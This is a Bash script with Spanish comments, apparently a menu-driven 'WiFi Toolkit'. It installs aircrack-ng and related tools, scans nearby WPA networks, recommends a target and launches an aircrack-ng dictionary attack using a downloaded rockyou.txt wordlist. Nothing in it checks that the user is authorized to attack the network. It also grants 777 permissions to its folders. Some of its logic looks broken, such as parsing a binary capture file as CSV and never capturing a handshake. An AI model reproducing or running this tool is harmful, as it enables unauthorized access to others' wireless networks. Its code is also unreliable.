#!/bin/bash

# Colores para la salida
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

# Configuración del proyecto
PROJECT_NAME="wifi_toolkit"
DOWNLOADS_DIR="$HOME/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog")

# Función para verificar e instalar dependencias
install_dependencies() {
    dialog --title "Instalación de Dependencias" --infobox "Verificando dependencias..." 8 40
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            dialog --title "Instalando $dep" --infobox "Instalando $dep..." 8 40
            sudo apt-get install -y "$dep" &>/dev/null || {
                dialog --title "Error" --msgbox "Error al instalar $dep. Instálalo manualmente." 8 40
                exit 1
            }
        fi
    done
    dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
}

# Crear carpetas del proyecto
prepare_project_directory() {
    mkdir -p "$PROJECT_DIR" "$RESULTS_DIR" 2>/dev/null
    sudo chmod -R 777 "$PROJECT_DIR" "$RESULTS_DIR" # Asignar permisos completos
}

# Escaneo en vivo de redes WiFi
live_scan_networks() {
    local interface=$(detect_wireless_interface)
    if [[ -z "$interface" ]]; then
        dialog --title "Error" --msgbox "No se encontró ninguna interfaz inalámbrica. Asegúrese de que el adaptador esté conectado." 8 40
        return
    fi

    dialog --title "Escaneo en Vivo" --infobox "Escaneando redes en tiempo real..." 8 40
    xterm -geometry 80x24+0+0 -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/live_scan" &
    sleep 10
    killall airodump-ng

    if [[ ! -f "$RESULTS_DIR/live_scan-01.cap" ]]; then
        dialog --title "Error" --msgbox "El archivo live_scan-01.cap no se generó. Verifica el proceso de escaneo." 8 40
        return
    fi

    show_scan_results "$RESULTS_DIR/live_scan-01.cap"
}

# Detectar interfaz inalámbrica
detect_wireless_interface() {
    iw dev | grep Interface | awk '{print $2}' | head -n 1
}

# Mostrar resultados del escaneo en vivo
show_scan_results() {
    local scan_file=$1
    if [[ -f "$scan_file" ]]; then
        parse_and_display_networks "$scan_file"
    else
        dialog --title "Error" --msgbox "No se encontraron resultados de escaneo." 8 40
    fi
}

# Analizar y mostrar redes encontradas
parse_and_display_networks() {
    local scan_file=$1
    local networks=()

    while IFS=, read -r bssid pwr beacons data mb enc cipher auth essid; do
        if [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            local color="$NC"
            if ((pwr > -30)); then
                color="$GREEN"
            elif ((pwr > -50)); then
                color="$YELLOW"
            elif ((pwr > -70)); then
                color="$RED"
            fi
            networks+=("$bssid" "${color}${essid} (${pwr} dBm)${NC}")
        fi
    done < <(grep WPA "$scan_file")

    if [[ ${#networks[@]} -eq 0 ]]; then
        dialog --title "Redes Encontradas" --msgbox "No se encontraron redes WPA/WPA2/WPA3." 8 40
        return
    fi

    local choice=$(dialog --title "Redes Encontradas" --menu "Seleccione una red para analizar:" 20 60 10 "${networks[@]}" 3>&1 1>&2 2>&3)

    if [[ -n "$choice" ]]; then
        recommend_and_attack "$choice"
    fi
}

# Recomendar red y atacar
recommend_and_attack() {
    local bssid=$1
    dialog --title "Recomendación" --yesno "Se recomienda atacar la red $bssid. ¿Desea continuar?" 8 40

    if [[ $? -eq 0 ]]; then
        perform_attack "$bssid"
    else
        dialog --title "Cancelado" --msgbox "El ataque ha sido cancelado por el usuario." 8 40
    fi
}

# Realizar ataque
perform_attack() {
    local bssid=$1
    local dictionary=$(find_or_download_dictionary)

    dialog --title "Ataque" --infobox "Iniciando ataque contra $bssid..." 8 40
    xterm -geometry 80x24+0+0 -hold -e "aircrack-ng -w $dictionary -b $bssid $RESULTS_DIR/live_scan-01.cap" &
}

# Buscar o descargar diccionario rockyou.txt
find_or_download_dictionary() {
    local dictionary_path=$(find / -type f -name "rockyou.txt" 2>/dev/null | head -n 1)
    if [[ -z "$dictionary_path" ]]; then
        dialog --title "Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 40
        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
        dictionary_path="$PROJECT_DIR/rockyou.txt"
    fi
    echo "$dictionary_path"
}

# Menú principal
main_menu() {
    while true; do
        option=$(dialog --title "WiFi Toolkit" --menu "Selecciona una opción:" 20 60 10 \
            1 "Instalar dependencias" \
            2 "Escaneo en vivo de redes" \
            3 "Listar y analizar redes" \
            4 "Salir" 3>&1 1>&2 2>&3)

        case $option in
            1) install_dependencies ;;
            2) live_scan_networks ;;
            3) show_scan_results "$RESULTS_DIR/live_scan-01.cap" ;;
            4) clear; exit 0 ;;
            *) dialog --title "Error" --msgbox "Opción no válida." 8 40 ;;
        esac
    done
}

# Inicio del script
install_dependencies
prepare_project_directory
main_menu
